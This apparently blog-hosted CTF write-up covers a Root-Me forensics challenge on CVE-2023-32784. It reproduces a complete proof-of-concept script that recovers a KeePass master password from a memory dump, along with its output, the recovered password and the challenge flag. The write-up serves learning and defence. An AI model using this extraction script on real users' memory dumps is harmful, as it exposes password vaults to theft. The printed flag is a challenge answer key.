---
title: Master kee root-me
time: 2025-03-16
categories: [ctf]
tags: [forensics]
cover: /images/cover.jpeg
---

# Cracking the MasterKee Challenge: Exploiting CVE-2023-32784

For this challenge, we are provided with two files:
- `MasterKee.DMP`
- `Masterkee.kdbx`

The goal is to extract the password from the `.DMP` file and use it to unlock the KeePass database (`Masterkee.kdbx`). After some research, I discovered that a specific version of KeePass is vulnerable to **CVE-2023-32784**, which allows extracting the master password from a memory dump.

---

## Step 1: Understanding the Vulnerability

CVE-2023-32784 is a vulnerability in KeePass that leaks portions of the master password in memory. By analyzing a memory dump (`.DMP`), we can recover parts of the password. The missing characters are represented as `●` in the output.

---

## Step 2: Using the Proof-of-Concept Script

I found a [PoC script on GitHub](https://github.com/) that exploits this vulnerability. Here's the script:

```python
import argparse
import logging
import itertools


class TaggedFormatter(logging.Formatter):

    TAGS = {
        'DEBUG': '\x1b[1;35m#\x1b[0m',
        'INFO': '\x1b[1;34m.\x1b[0m',
        'WARNING': '\x1b[1;33m-\x1b[0m',
        'ERROR': '\x1b[1;31m!\x1b[0m',
        'CRITICAL': '\x1b[1;31m!!\x1b[0m'
    }

    def __init__(self, format):
        logging.Formatter.__init__(self, format)

    def format(self, record):
        levelname = record.levelname

        if levelname in self.TAGS:
            record.levelname = self.TAGS[levelname]

        return logging.Formatter.format(self, record)


def setup_logging(debug = False):
    formatter = TaggedFormatter('%(asctime)s [%(levelname)s] [%(name)s] %(message)s')
    handler = logging.StreamHandler()
    root_logger = logging.getLogger()

    handler.setFormatter(formatter)
    root_logger.addHandler(handler)

    if debug:
        root_logger.setLevel(logging.DEBUG)
    else:
        root_logger.setLevel(logging.INFO)


def parse_args():
    parser = argparse.ArgumentParser(description='CVE-2023-32784 proof-of-concept')

    parser.add_argument('dump', type=str, help='The path of the memory dump to analyze')
    parser.add_argument('-d', '--debug', dest='debug', action='store_true', help='Enable debugging mode')

    return parser.parse_args()


def get_candidates(dump_file):
    data = dump_file.read()
    candidates = []
    str_len = 0
    i = 0

    while i < len(data)-1:
        if (data[i] == 0xCF) and (data[i + 1] == 0x25):
            str_len += 1
            i += 1
        elif str_len > 0:
            if (data[i] >= 0x20) and (data[i] <= 0x7E) and (data[i + 1] == 0x00):
                candidate = (str_len * b'\xCF\x25') + bytes([data[i], data[i + 1]])

                if not candidate in candidates:
                    candidates.append(candidate)
            
            str_len = 0
        
        i += 1
    
    return candidates


if __name__ == '__main__':
    args = parse_args()
    setup_logging(args.debug)
    logger = logging.getLogger('main')

    with open(args.dump, 'rb') as dump_file:
        logger.info(f'Opened {dump_file.name}')

        candidates = get_candidates(dump_file)
        candidates = [x.decode('utf-16-le') for x in candidates]
        groups = [[] for i in range(max([len(i) for i in candidates]))]

        for candidate in candidates:
            groups[len(candidate) - 1].append(candidate[-1])
        
        for i in range(len(groups)):
            if len(groups[i]) == 0:
                groups[i].append(b'\xCF\x25'.decode('utf-16-le'))
        
        for password in itertools.product(*groups):
            password = ''.join(password)
            print(f'Possible password: {password}')
```

---

## Step 3: Running the Script

I ran the script against the `MasterKee.DMP` file, and it produced the following output:


```
➜  forensics python3 exp.py -d MasterKee.DMP

2025-03-10 16:23:37,315 [.] [main] Opened MasterKee.DMP

Possible password: ●ere_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●3re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●'re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●Dre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●\re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●#re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●yre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●kre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●9re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●;re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●Hre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●Bre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●qre_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
Possible password: ●are_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
```

---

## Step 4: Analyzing the Output

The script revealed that the first character of the password is missing (`●`). Based on the context, I guessed that the missing character is likely an **`H`**, making the password:


`Here_Is_My_V3ry_S3cr3t_P4ssw0rd2024!`

---

## Step 5: Unlocking the KeePass Database

I opened the `Masterkee.kdbx` file in KeePass and entered the password:

`Here_Is_My_V3ry_S3cr3t_P4ssw0rd2024!`

---

## Step 6: Success!

The database unlocked, and I found the flag:


`RM{Upd4T3_KeEPas5_t0_2.54}`

---

## Conclusion

This challenge was a great way to learn about memory forensics and real-world vulnerabilities like `CVE-2023-32784`. Always ensure your software is up-to-date to avoid such exploits!

---

**Flag:** `RM{Upd4T3_KeEPas5_t0_2.54}`
